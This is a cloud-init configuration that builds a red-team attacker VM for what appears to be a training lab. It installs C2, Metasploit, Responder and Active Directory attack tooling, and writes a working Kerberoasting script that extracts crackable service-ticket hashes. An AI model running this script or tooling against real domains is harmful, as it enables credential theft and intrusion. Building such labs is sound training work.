#cloud-config
hostname: redteam
manage_etc_hosts: false
package_update: true
package_upgrade: true     # start patched; deploy-soc-lab.sh reboots if an update needs it

ssh_authorized_keys: __ANSIBLE_KEYS__   # [] without ansible-ctrl

write_files:
  - path: /usr/local/bin/lab-kerberoast
    permissions: '0o755'   # explicit octal: Multipass turns '0755' into the integer 493, which fails cloud-init's schema
    content: |
      #!/opt/redteam-venv/bin/python3
      """Kerberoast one SPN and print the ticket as a hashcat/john hash.

      Samba 4.19's KDC rejects impacket's TGS-REQ ("No authenticator in request":
      impacket sends no authenticator checksum), so GetUserSPNs -request and nxc
      --kerberoasting fail against this lab. MIT's kinit/kvno build a valid
      request; this script uses them and reads the ticket back with impacket.

      Usage: lab-kerberoast <user> <password> <spn> <spn-account>
        e.g. lab-kerberoast alice.user 'Passw0rd!23' MSSQLSvc/fs01.lab.local:1433 svc_sql
      """
      import os
      import subprocess
      import sys
      import tempfile
      from binascii import hexlify

      from impacket.krb5.asn1 import Ticket
      from impacket.krb5.ccache import CCache
      from pyasn1.codec.der import decoder

      if len(sys.argv) != 5:
          sys.exit(__doc__)
      user, password, spn, account = sys.argv[1:]
      realm = os.environ.get("LAB_REALM", "__DOMAIN_REALM__")

      with tempfile.TemporaryDirectory() as tmp:
          env = dict(os.environ, KRB5CCNAME=f"FILE:{tmp}/cc")
          for cmd, stdin in ((["kinit", f"{user}@{realm}"], password + "\n"), (["kvno", f"{spn}@{realm}"], None)):
              r = subprocess.run(cmd, input=stdin, text=True, env=env, capture_output=True)
              if r.returncode != 0:
                  sys.exit(f"{' '.join(cmd)} failed: {r.stderr.strip()}")
          ccache = CCache.loadFile(f"{tmp}/cc")

      for cred in ccache.credentials:
          server = cred["server"].prettyPrint().decode()
          if not server.lower().startswith(spn.lower()):
              continue
          ticket = decoder.decode(cred.ticket["data"], asn1Spec=Ticket())[0]
          etype = int(ticket["enc-part"]["etype"])
          cipher = bytes(ticket["enc-part"]["cipher"])
          spn_field = spn.replace(":", "~")
          if etype == 23:   # RC4-HMAC: hashcat -m 13100
              print(f"$krb5tgs$23$*{account}${realm}${spn_field}*${hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}")
          elif etype in (17, 18):   # AES: hashcat -m 19600 / 19700
              print(f"$krb5tgs${etype}${account}${realm}$*{spn_field}*${hexlify(cipher[-12:]).decode()}${hexlify(cipher[:-12]).decode()}")
          else:
              sys.exit(f"unsupported ticket encryption type {etype}")
          break
      else:
          sys.exit(f"no service ticket for {spn} in the cache")
  - path: /root/provision.sh
    permissions: '0o755'   # explicit octal: Multipass turns '0755' into the integer 493, which fails cloud-init's schema
    content: |
      #!/bin/bash
      set -euo pipefail
      lab_step() {   # progress for deploy-soc-lab.sh's panel: "<n> <what>" in /run/lab-progress
          LAB_STEP=$((${LAB_STEP:-0} + 1))
          printf '%s %s\n' "${LAB_STEP}" "$*" > /run/lab-progress
          echo "== step ${LAB_STEP}: $*"
      }
      export DEBIAN_FRONTEND=noninteractive

      DC_IP="__DC_IP__"
      DOMAIN_REALM="__DOMAIN_REALM__"
      KALI_TOOLS="__KALI_TOOLS__"   # 1 in the pentest lab: deploy-soc-lab.sh sets it from the lab

      hostnamectl set-hostname redteam

      # Resolve lab hostnames without joining the domain -- this box plays
      # the external/breached-host attacker perspective on purpose.
      # Point this box's DNS at the DC for the AD domain, persistently: a
      # systemd-resolved drop-in survives reboots and DHCP renewals. (The old
      # netplan drop-in + per-link `resolvectl` override was lost on reboot.)
      if [ -n "${DC_IP}" ]; then
          mkdir -p /etc/systemd/resolved.conf.d
          cat > /etc/systemd/resolved.conf.d/lab-dns.conf <<EOF
      [Resolve]
      DNS=${DC_IP}
      Domains=${DOMAIN_REALM,,}
      EOF
          systemctl restart systemd-resolved
          resolvectl flush-caches 2>/dev/null || true
      fi

      apt-get update -y
      lab_step "Installing attack tools (apt)"
      apt-get install -y nmap hydra gobuster smbclient ldap-utils hashcat \
          python3-pip python3-venv pipx git krb5-user

      # Kerberos client config for the lab realm (the krb5-user package
      # otherwise leaves its example default realm in place).
      cat > /etc/krb5.conf <<EOF
      [libdefaults]
          default_realm = ${DOMAIN_REALM}
          dns_lookup_realm = false
          dns_lookup_kdc = true
      EOF

      # Rust toolchain for netexec's aardwolf dependency (a Rust extension).
      # Ubuntu 24.04's default `cargo` (1.75) is too old to read aardwolf's
      # Cargo.lock, so install the newest versioned toolchain Ubuntu offers
      # (cargo-1.NN / rustc-1.NN, kept under /usr/lib/rust-1.NN/bin).
      RUST_VER=$(apt-cache search --names-only '^cargo-1\.[0-9]+$' | awk '{print $1}' \
          | sed 's/^cargo-//' | sort -V | tail -n 1)
      lab_step "Installing Rust"
      apt-get install -y "cargo-${RUST_VER}" "rustc-${RUST_VER}"
      RUST_BIN="/usr/lib/rust-${RUST_VER}/bin"

      # Offensive Python tooling for AD attack-path practice.
      # impacket/bloodhound install fine from PyPI via a plain venv.
      lab_step "Installing Python tooling"
      python3 -m venv /opt/redteam-venv
      /opt/redteam-venv/bin/pip install --upgrade pip
      /opt/redteam-venv/bin/pip install impacket bloodhound

      # netexec is a separate case: plain `pip install netexec` doesn't
      # reliably resolve on PyPI (seen failing outright in testing here).
      # Its own docs recommend pipx, ideally straight from the GitHub repo,
      # which is what actually works. Installed for the `ubuntu` user (not
      # root) since that's who logs in interactively via `multipass shell`.
      lab_step "Installing netexec"
      sudo -u ubuntu env PATH="${RUST_BIN}:${PATH}" \
          pipx install git+https://github.com/Pennyw0rth/NetExec \
          || echo "WARNING: netexec install failed -- see /home/ubuntu/.local/state/pipx/log/ on the box for details. The rest of the redteam tools are unaffected."
      sudo -u ubuntu pipx ensurepath || true

      lab_step "Installing Sliver C2"
      # Sliver C2 framework (server + client), pinned and checksum-verified.
      # Start it interactively on this box with: sudo sliver-server
      SLIVER_VERSION="v1.7.8"
      for bin in "sliver-server af9770ba37446b94cc2d535f274e09e7b84b6689a535f8a92c80a441f7ec04be" \
                 "sliver-client 5f0fa2074b7690eadea90ccc7d43d33b21bf1f9fea265624eea481fd7ddcb5e7"; do
          read -r name sha <<< "${bin}"
          curl -fsSL -o "/usr/local/bin/${name}" \
              "https://github.com/BishopFox/sliver/releases/download/${SLIVER_VERSION}/${name}_linux-arm64"
          echo "${sha}  /usr/local/bin/${name}" | sha256sum -c -
          chmod 755 "/usr/local/bin/${name}"
      done
      # Unpack the server's assets now so the first interactive start is quick.
      HOME=/root /usr/local/bin/sliver-server unpack --force

      # Kali tool set, pentest lab only. Everything below is arm64-native and
      # off the shelf: Ubuntu packages, Rapid7's and PortSwigger's own builds,
      # and pinned, checksum-verified GitHub release tags.
      if [ "${KALI_TOOLS}" = "1" ]; then
          lab_step "Installing Kali tools (apt)"
          # nikto is in multiverse (Ubuntu's cloud images usually enable it already).
          if ! grep -qsw multiverse /etc/apt/sources.list.d/ubuntu.sources /etc/apt/sources.list; then
              add-apt-repository -y multiverse
          fi
          apt-get update -y
          # hydra and gobuster come with the base set above. samba-common-bin
          # (nmblookup, rpcclient) is for enum4linux-ng; python3-netifaces and
          # python3-aioquic are Responder's dependencies.
          apt-get install -y sqlmap john ffuf nikto dirb samba-common-bin \
              python3-netifaces python3-aioquic

          lab_step "Installing Metasploit Framework"
          # Rapid7's own apt repo (what their msfinstall script sets up). It only
          # carries the current nightly build, arm64 included, so Metasploit is
          # the one tool here that can't be pinned to a version. The repo's
          # signing key is checked against its fingerprint before it is trusted.
          MSF_KEY_FPR="97B32012EA1176F053727A95C048F0B49DEEC457"
          curl -fsSL -o /tmp/metasploit.asc https://apt.metasploit.com/metasploit-framework.gpg.key
          fpr=$(GNUPGHOME="$(mktemp -d)" gpg --show-keys --with-colons /tmp/metasploit.asc | awk -F: '/^fpr/ {print $10; exit}')
          if [ "${fpr}" != "${MSF_KEY_FPR}" ]; then
              echo "ERROR: Metasploit signing key has fingerprint '${fpr}', expected ${MSF_KEY_FPR}"
              exit 1
          fi
          gpg --dearmor < /tmp/metasploit.asc > /usr/share/keyrings/metasploit-framework.gpg
          rm -f /tmp/metasploit.asc
          echo "deb [signed-by=/usr/share/keyrings/metasploit-framework.gpg] https://apt.metasploit.com/ lucid main" \
              > /etc/apt/sources.list.d/metasploit-framework.list
          apt-get update -y
          apt-get install -y metasploit-framework
          # msfconsole's first start asks interactive setup questions (and hangs
          # without a terminal). Mark the setup done with no database, so it
          # starts straight away; `msfdb init` adds the database when wanted.
          install -d -o ubuntu -g ubuntu /home/ubuntu/.msf4
          sudo -u ubuntu touch /home/ubuntu/.msf4/initial_setup_complete

          lab_step "Installing Burp Suite Community"
          # PortSwigger's Linux ARM installer (one desktop installer for Community
          # and Professional: without a licence it runs as Community), checked
          # against the SHA-256 published on the release page. It's a GUI app:
          # run it with X forwarding (ssh -X) or from a desktop session.
          BURP_VERSION=2026.10.1
          BURP_SHA256=1d8995cf82ca045c4f585a9cebaf3d18f4a073557a0fe05276d4cf6c69fa7478
          curl -fsSL -o /tmp/burp-installer.sh \
              "https://portswigger.net/burp/releases/startdownload?product=desktop&version=${BURP_VERSION}&type=linuxarm64"
          echo "${BURP_SHA256}  /tmp/burp-installer.sh" | sha256sum -c -
          sh /tmp/burp-installer.sh -q -overwrite -dir /opt/BurpSuiteCommunity
          rm -f /tmp/burp-installer.sh
          burp_launcher=$(find /opt/BurpSuiteCommunity -maxdepth 1 -type f -name 'BurpSuite*' -perm -u+x | sort | head -n 1 || true)
          if [ -z "${burp_launcher}" ]; then
              echo "ERROR: the Burp installer left no launcher in /opt/BurpSuiteCommunity"
              exit 1
          fi
          ln -sf "${burp_launcher}" /usr/local/bin/burpsuite

          lab_step "Installing SecLists, Responder and enum4linux-ng"
          fetch_tag() {   # fetch_tag <owner/repo> <tag> <sha256> <dest>: a pinned tag's source, checksum-verified
              curl -fsSL -o /tmp/release.tar.gz "https://github.com/$1/archive/refs/tags/$2.tar.gz"
              echo "$3  /tmp/release.tar.gz" | sha256sum -c -
              rm -rf "$4"
              mkdir -p "$4"
              tar -xzf /tmp/release.tar.gz -C "$4" --strip-components=1
              rm -f /tmp/release.tar.gz
          }
          SECLISTS_TAG=2026.2
          RESPONDER_TAG=v3.2.2.0
          ENUM4LINUX_NG_TAG=v1.3.10
          fetch_tag danielmiessler/SecLists "${SECLISTS_TAG}" \
              696d872f543bbbcdcbed64f1dd73671167b2d0281c074121cf63f3dd6ace386d /usr/share/seclists
          fetch_tag lgandx/Responder "${RESPONDER_TAG}" \
              2b64693e4aad99ffe0d9a7ed76e5a118bbb78300e84d7065991fa75baf11550e /opt/Responder
          fetch_tag cddmp/enum4linux-ng "${ENUM4LINUX_NG_TAG}" \
              563235acd56278dbcc405e436d78cf29eaa55dc83b11b6c38d46077198f6a427 /opt/enum4linux-ng
          # enum4linux-ng needs impacket and ldap3 (already in the venv) and PyYAML.
          /opt/redteam-venv/bin/pip install pyyaml
          printf '#!/bin/sh\nexec python3 /opt/Responder/Responder.py "$@"\n' > /usr/local/bin/responder
          printf '#!/bin/sh\nexec /opt/redteam-venv/bin/python3 /opt/enum4linux-ng/enum4linux-ng.py "$@"\n' \
              > /usr/local/bin/enum4linux-ng
          chmod 755 /usr/local/bin/responder /usr/local/bin/enum4linux-ng

          echo "Kali tools: msfconsole, burpsuite (GUI), sqlmap, hydra, john, gobuster,"
          echo "ffuf, nikto, dirb, sudo responder, enum4linux-ng; wordlists in /usr/share/seclists."
      fi

      # Put the tools on every shell's PATH (not only login shells), with
      # impacket's scripts also available under the Debian/Kali-style names
      # used in the README, e.g. impacket-GetUserSPNs -> GetUserSPNs.py.
      for script in /opt/redteam-venv/bin/*.py; do
          tool=$(basename "${script}" .py)
          ln -sf "${script}" "/usr/local/bin/impacket-${tool}"
      done
      ln -sf /opt/redteam-venv/bin/bloodhound-python /usr/local/bin/bloodhound-python
      for tool in nxc netexec; do
          if [ -x "/home/ubuntu/.local/bin/${tool}" ]; then
              ln -sf "/home/ubuntu/.local/bin/${tool}" "/usr/local/bin/${tool}"
          fi
      done

      cat > /etc/profile.d/redteam-venv.sh <<'EOF'
      export PATH="/opt/redteam-venv/bin:$PATH"
      EOF

      echo "redteam box ready. Tools: nmap, hydra, gobuster, smbclient, ldapsearch,"
      echo "impacket-* / bloodhound-python / netexec (crackmapexec successor), hashcat,"
      echo "lab-kerberoast, and the Sliver C2 framework (sudo sliver-server)."
      echo "The pentest lab adds the Kali tool set (Metasploit, Burp Suite and more)."

runcmd:
  - /root/provision.sh > /var/log/provision.log 2>&1
